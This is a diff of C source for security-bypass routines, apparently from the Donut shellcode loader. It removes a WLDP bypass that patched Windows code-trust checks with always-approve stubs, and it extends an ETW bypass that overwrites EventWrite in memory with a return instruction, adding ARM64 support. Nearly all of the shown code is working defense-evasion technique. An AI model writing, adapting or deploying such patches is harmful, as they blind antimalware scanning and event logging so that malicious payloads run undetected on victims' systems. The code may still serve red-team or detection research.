@@ -1,6 +1,11 @@
 #include "bypass.h"
 
 
+//
+// AMSI bypass
+//
+
+
 #if defined(BYPASS_AMSI_A)
 
 BOOL IsReadablePage(DWORD protect)
@@ -149,6 +154,12 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst)
 
 #endif
 
+
+//
+// WLDP bypass
+//
+
+
 #if defined(BYPASS_WLDP_A)
 
 BOOL DisableWLDP(PDONUT_INSTANCE inst) 
@@ -158,98 +169,17 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst)
 
 #elif defined(BYPASS_WLDP_B)
 
-// fake function that always returns S_OK and isApproved = TRUE
-HRESULT WINAPI WldpIsClassInApprovedListStub(
-    REFCLSID               classID,
-    PWLDP_HOST_INFORMATION hostInformation,
-    PBOOL                  isApproved,
-    DWORD                  optionalFlags)
-{
-    *isApproved = TRUE;
-    return S_OK;
-}
-
-// make sure prototype and code are different from other subroutines
-// to avoid removal by MSVC
-int WldpIsClassInApprovedListStubEnd(int a, int b) {
-  return a - b;
-}
-
-// fake function that always returns S_OK
-HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
-    HANDLE fileHandle,
-    PVOID  baseImage,
-    ULONG  ImageSize)
-{
-    return S_OK;
-}
-
-int WldpQueryDynamicCodeTrustStubEnd(int a, int b) {
-  return a / b;
-}
-
 BOOL DisableWLDP(PDONUT_INSTANCE inst) 
 {
-    HMODULE wldp;
-    DWORD   len, op, t;
-    LPVOID  cs;
-    
-    // try load wldp. if unable, assume DLL doesn't exist
-    // and return TRUE to indicate it's okay to continue
-    wldp = xGetLibAddress(inst, inst->wldp);
-    if(wldp == NULL) return TRUE;
-    
-    // resolve address of WldpQueryDynamicCodeTrust
-    // if not found, return FALSE because it should exist
-    cs = xGetProcAddress(inst, wldp, inst->wldpQuery, 0);
-    if(cs == NULL) return FALSE;
-    
-    // calculate length of stub
-    len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd -
-          (ULONG_PTR)WldpQueryDynamicCodeTrustStub;
-      
-    DPRINT("Length of WldpQueryDynamicCodeTrustStub is %" PRIi32 " bytes.", len);
-    
-    // check for negative length. this would only happen when
-    // compiler decides to re-order functions.
-    if((int)len < 0) return FALSE;
-    
-    // make the memory writeable. return FALSE on error
-    if(!inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
-      
-    // overwrite with virtual address of stub
-    Memcpy(cs, ADR(PCHAR, WldpQueryDynamicCodeTrustStub), len);
-    // set back to original protection
-    inst->api.VirtualProtect(cs, len, op, &t);
-    
-    // resolve address of WldpIsClassInApprovedList
-    // if not found, return FALSE because it should exist
-    cs = xGetProcAddress(inst, wldp, inst->wldpIsApproved, 0);
-    if(cs == NULL) return FALSE;
-    
-    // calculate length of stub
-    len = (ULONG_PTR)WldpIsClassInApprovedListStubEnd -
-          (ULONG_PTR)WldpIsClassInApprovedListStub;
-    
-    DPRINT("Length of WldpIsClassInApprovedListStub is %" PRIi32 " bytes.", len);
-    
-    // check for negative length. this would only happen when
-    // compiler decides to re-order functions.
-    if((int)len < 0) return FALSE;
-    
-    // make the memory writeable. return FALSE on error
-    if(!inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
-      
-    // overwrite with virtual address of stub
-    Memcpy(cs, ADR(PCHAR, WldpIsClassInApprovedListStub), len);
-    // set back to original protection
-    inst->api.VirtualProtect(cs, len, op, &t);
-    
     return TRUE;
 }
 #endif
+
+
+//
+// ETW bypass
+//
+
 
 #if defined(BYPASS_ETW_A)
 
@@ -264,21 +194,19 @@ BOOL DisableETW(PDONUT_INSTANCE inst)
     if (pEventWrite  == NULL) 
       return FALSE;
 
-#ifdef _WIN64
+    if (!inst->api.VirtualProtect(pEventWrite, 1024, PAGE_EXECUTE_READWRITE, &op)) 
+        return FALSE;
 
-    if (!inst->api.VirtualProtect(pEventWrite, 4, PAGE_EXECUTE_READWRITE, &op)) 
-      return FALSE;
+#if defined(_M_ARM64) || defined(__aarch64__)
+    Memcpy(pEventWrite, inst->etwRetArm, 8);
+#elif defined(_WIN64)
     Memcpy(pEventWrite, inst->etwRet64, 4);
-    inst->api.VirtualProtect(pEventWrite, 4, op, &t);
-
 #else
-
-    if (!inst->api.VirtualProtect(pEventWrite, 5, PAGE_EXECUTE_READWRITE, &op)) 
-      return FALSE;
     Memcpy(pEventWrite, inst->etwRet32, 5);
-    inst->api.VirtualProtect(pEventWrite, 5, op, &t);
-
 #endif
+
+    inst->api.VirtualProtect(pEventWrite, 1024, op, &t);
+
 
     return TRUE;
 }
